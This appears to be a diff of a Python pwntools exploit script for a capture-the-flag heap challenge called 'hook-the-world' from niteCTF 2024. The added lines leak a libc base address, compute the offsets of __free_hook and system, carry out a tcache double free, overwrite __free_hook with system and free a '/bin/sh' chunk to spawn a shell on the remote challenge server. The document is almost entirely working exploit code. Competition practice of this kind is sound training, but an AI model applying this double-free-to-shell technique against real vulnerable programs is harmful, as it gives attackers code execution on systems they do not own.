@@ -6,11 +6,11 @@ def get_chest(r, idx, sizechst):
     r.sendline(b'1')
 
     # chest's number
-    r.recvuntil(':')
+    r.recvuntil('number:')
     r.sendline(idx)
 
     # chest's size
-    r.recvuntil(':')
+    r.recvuntil('size:')
     r.sendline(sizechst)
 
 def lazy_people(r, idx):
@@ -45,33 +45,44 @@ def review_profit(r, idx):
 
 def exploit(checkRemote):
     if(checkRemote is True):
-        r = remote()
+        r = remote('hook-the-world.chals.nitectf2024.live', 1337, ssl=True)
     else:
-        context.binary = ELF('./chall', checksec=False)
+        context.binary = ELF('./chall_patched', checksec=False)
         r = process()
     
-    for i in range(10):
-        get_chest(r, i.to_bytes(4), b'32')
-    # get_chest(r, b'1', b'32')
-    # get_chest(r, b'2', b'32')
-    # get_chest(r, b'3', b'32')
-    # get_chest(r, b'4', b'32')
-    # get_chest(r, b'5', b'32')
-    # get_chest(r, b'6', b'32')
-    # get_chest(r, b'7', b'32')
-    # get_chest(r, b'8', b'32')
+    for i in range(0, 9):
+        get_chest(r, str(i), b'145')
+        print('Loop :', i)
     
-    for i in range(10):
-        lazy_people(r, i.to_bytes(4))
-    # lazy_people(r, b'1')
-    # lazy_people(r, b'2')
-    # lazy_people(r, b'3')
-    # lazy_people(r, b'4')
-    # lazy_people(r, b'5')
-    # lazy_people(r, b'6')
-    # lazy_people(r, b'7')
-    # lazy_people(r, b'8')
+    for i in range(0, 9):
+        lazy_people(r, str(i))
     
+    # Get libc address
+    get_chest(r, b'9', b'20')
+    review_profit(r, b'9')
+    libcbase_addr = u64(r.recv(8)) - 0x3ebca0
+    free_hook_addr = libcbase_addr + 0x3eaef0 + 0x29f8
+    system_addr = libcbase_addr + 0x4f420
+    free_addr = libcbase_addr + 0x97910
+    log.info(f'Address of libc base is: {hex(libcbase_addr)}')
+    log.info(f'Address of __free_hook() is: {hex(free_hook_addr)}')
+    log.info(f'Address of system() is: {hex(system_addr)}')
+    log.info(f'Address of free() is: {hex(free_addr)}')
+
+    # Double Free
+    get_chest(r, b'10', b'64')
+    lazy_people(r, b'10')
+    fill_chest(r, b'10', b'B'*8)
+    lazy_people(r, b'10')
+
+    # Overwrite __free_hook() with system()
+    fill_chest(r, b'10', p64(free_hook_addr))
+    get_chest(r, b'11', b'64')
+    get_chest(r, b'12', b'64')
+    fill_chest(r, b'12', p64(system_addr))
+    get_chest(r, b'14', b'64')
+    fill_chest(r, b'14', b'/bin/sh')
+    lazy_people(r, b'14')
     r.interactive()
 
 exploit(False)
